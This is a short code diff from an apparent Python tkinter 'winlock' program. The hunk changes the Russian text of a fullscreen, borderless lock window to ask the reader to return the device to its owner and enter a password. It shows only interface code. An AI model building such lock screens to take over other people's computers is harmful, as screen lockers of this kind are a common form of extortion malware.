@@ -19,7 +19,7 @@ def winlock():
     root.attributes('-fullscreen', 1)
     root.overrideredirect(1)
 
-    Label(text="Ваш windows заблокирован", fg="red", bg=bg, font=font,).pack()
+    Label(text="Ваш windows заблокирован, верните устройство владельцу", fg="red", bg=bg, font=font,).pack()
     Label(text='\n\n\n\nВведите пароль', fg='white', bg=bg, font=font).pack()
 
     password = Entry(font=font)
